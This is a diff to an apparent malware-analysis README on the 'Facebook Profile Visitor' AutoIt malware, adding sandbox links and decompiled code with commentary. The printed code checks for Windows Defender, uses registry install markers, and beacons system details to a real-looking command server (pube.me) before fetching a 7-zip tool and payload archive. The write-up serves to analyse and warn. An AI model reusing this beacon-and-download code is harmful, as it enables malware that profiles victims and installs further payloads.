@@ -3,15 +3,16 @@
 <i>Facebook Profile Visitor</i> (Sometimes also called <i>Profile Visitor</i>) is a virus that has spread on Facebook since 03/2020 until now.
 
 ## What does it do?
-It mines coin (particularly XMRIG) on your computer and stoles your Facebook account to spread the virus.
+It mines coin (particularly Monero) using the tool Xmrig on your computer and stoles your Facebook account to spread the virus.
 
 ## Example?
 ![Vietnamese version of the virus](https://user-images.githubusercontent.com/68118236/145680558-47cabfdf-95be-4eae-b13b-7e7fc62a0a43.png)
 <br>Vietnamese version of the virus that spread on Facebook, said "Hello, you can know who visited your profile with the Profile Visitor app"
 
-## VirusTotal and Any.run
+## Some sandbox links
 [VirusTotal](https://www.virustotal.com/gui/file/f479135d5db8e2f6dff59252b8e51ebd9414a226df908f994376415c20b9446d/detection)
 [Any.run](https://app.any.run/tasks/c13f22e8-be22-4ea2-b350-a97efcfd948e)
+[VMRay](https://www.vmray.com/analyses/89516baa335e/report/overview.html)
 
 ## How does it work?
 <b>Be careful when clicking any of these links!!!</b>
@@ -94,6 +95,7 @@ function(data)
 ### 3) The zip
 After extract the zip with the provided password, it only has one file named `visitor.facebook.com`. It looks like an old 16-bit app, but actually it is an 64-bit app written in AutoIt scripting language. See VT for more information.
 <br> In case you don't know, AutoIt is a interpreter language, which means it has to be phrased and executed at runtime. So, we can get the source code from it easily.
+<br> Some notes: It shows that the exe is a 64-bit app, so it cannot run on the Windows x86 environment.
 
 ### 4) Decompile
 <br> Refer to [VinCSS post](https://blog.vincss.net/2020/02/phuong-phap-trich-xuat-malicious-autoit-script.html), I decompiled it by:
@@ -301,9 +303,9 @@ Func main() ; Main!!!!! - Check if vaild name
 										   ; if the program is decompiled and then recompiled?
 		Exit
 	Else
-		Global $wintitle = WinGetTitle("[ACTIVE]") ; Get current active windows / current focused windows
+		Global $wintitle = WinGetTitle("[ACTIVE]") ; Get current active windows / current focused windows to report later
 		If $wintitle = "" Then
-			$wintitle = "Empty" ; Why set the windows title to empty??????
+			$wintitle = "Empty" ;
 		EndIf
 		main2() ; Call main2
 	EndIf
@@ -336,5 +338,89 @@ Func main3() ; Ping server
 EndFunc
 ```
 <br> It Ping google to check if internet connection is available - the old trick
-
-# I will continue to write tomorrow! Bye!
+<br> `main4`:
+```autoit
+Func main4() ; Search for Windows Defender
+	Global $cghylztxnjb = ProcessExists("MsMpEng.exe") ; Searching for Windows Defender, and report to the server. See below
+	main5()
+EndFunc
+```
+<br> It checks if the process `MsMpEng.exe` available and report to the server. `MsMpEng.exe` is a part of Windows Defender.
+<br> `main5`:
+```autoit
+Func main5()
+	$vzmpkv = RegRead("HKCU\Software\Unzip", "Installed") ; Open registry key "HKCU\Software\Unzip" and read the value "Installed"
+	Global $itbnnhl = RegRead("HKCU\Software\Unzip", "Trust")
+	If $vzmpkv = "Yes" Then ; Check key
+		found_unzip() ; Found Unzip
+	Else
+		$vzmpkv = "No" 
+		notfound_unzip() ; Not found
+	EndIf
+EndFunc
+```
+<br> The virus write to the `HKCU\Software\Unzip` key with the value `Installed` and `Trust` to check if the virus has been activated or not
+<br> If the value `unzip` not found, it jump to the function `notfound_unzip`:
+```autoit
+Func notfound_unzip()
+	For $i = 1 To $lsrlgh[0] ; StringSplit("Start|cmd.exe|ProgramManager", "|")
+		If StringInStr($wintitle, $lsrlgh[$i]) <> 0 Then
+			ConsoleWrite("Exit:IsBannedWindow")
+			Exit
+		EndIf
+	Next
+	found_unzip() ; Why jump?
+EndFunc
+```
+<br> From what I understand, it check if the Title of the script has the string 'Start', 'cmd.exe' or 'ProgramManager'. If it has none of them, it exits. I think it's a check if the script is vailded or not.
+<br> If `unzip` key is found, or if it passed the function `notfound_unzip`, it jump to the function `found_unzip`:
+```autoit
+Func found_unzip() ; Submit system information to server and get malaware from it!
+	; Finally, http request!
+	; Actually this function is from win32api
+	; False means only one request, not multiple connections.
+	
+	; From what I saw here, they send some information of the system to the server.
+	Global $httprequest = ObjCreate("winhttp.winhttprequest.5.1")
+	$httprequest.Open("HEAD", "http://pube.me/app/login.php", False)
+	$httprequest.setRequestHeader("User-Agent", "Unzip")
+	$httprequest.setRequestHeader("Windows", $wintitle)
+	$httprequest.setRequestHeader("ScriptName", @ScriptName)
+	$httprequest.setRequestHeader("OS", @OSVersion)
+	$httprequest.setRequestHeader("DefenderActive", ProcessExists("MsMpEng.exe"))
+	$httprequest.setRequestHeader("CPU", "X64") ; I don't know why undefined. so default "X86". Originally @CPUArch
+	$httprequest.setRequestHeader("Installed", $vzmpkv) ; Installed unzip or not?
+	$httprequest.setRequestHeader("Version", 1) ; Don't know why it always be 1
+	If RegRead("HKCU\Software\Unzip", "Trust") <> "No" Then ; Remember $itbnnhl = RegRead("HKCU\Software\Unzip", "Trust")
+		; If that program installed
+		$httprequest.setRequestHeader("Trust", "No")
+	EndIf
+	$httprequest.Send() ; Send the request to server
+	$requeststatus = $httprequest.Status ; Get request submit status
+	If $requeststatus <> 200 Then ; Check if request sent or not, Http 200 code means succeeded
+		ConsoleWrite("http://pube.me/app/login.php")
+		ConsoleWrite("Response" & $requeststatus) ; Write the response code
+		ConsoleWrite("Exit:GetConfig")
+		Exit
+	EndIf
+	Global $sevenzipurl = $httprequest.GetResponseHeader("unzip")
+	Global $virusurl = $httprequest.GetResponseHeader("zip") ; Get the file url to download
+	main6($sevenzipurl, $virusurl)
+EndFunc
+```
+<br> Note: for some reason the AutoIt version installed on my computer didn't recognise the macro `@CPUArch`, so I just replace it with `X64` because the executable is compiled only for X64.
+<br> It send the `HEAD` request to the URL `http://pube.me/app/login.php`. This URL often got 1020 error by CloudFlare (still don't know why).
+<br> Then it send the following infomations in the header:
+|Name|Value|
+|----|----|
+|`User-Agent`|`Unzip`|
+|`Windows`|The current active window title before you run the virus, for example `Blank Page - Internet Explorer` if you download and start the virus from it|
+|`ScriptName`|The script name, in my case `visitor.facebook.com`|
+|`OS`|Your Windows version, for example `WIN_10` if you are running Windows 10|
+|`DefenderActive`|The current active status of your Windows Defender. `1` if active and `0` if not|
+|`CPU`|Your CPU architecture. The executable is for x86_64 so it cannot be run on x86 cpu. I didn't check if it could run on ARM64 with x86_64 emulation or not|
+|`Installed`|Whether the virus has activated or not, return `Yes` or `No`|
+|`Version`|Always return `1`|
+|`Trust`|Only send if the virus installed|
+<br> Then it sent to the server and wait for the status. If the status is not 200 (Successful), it print the error and exit.
+<br> If status is 200, the server will sent the `7-zip` extractor `7za.exe` and the virus archive `files.7z` download URL.
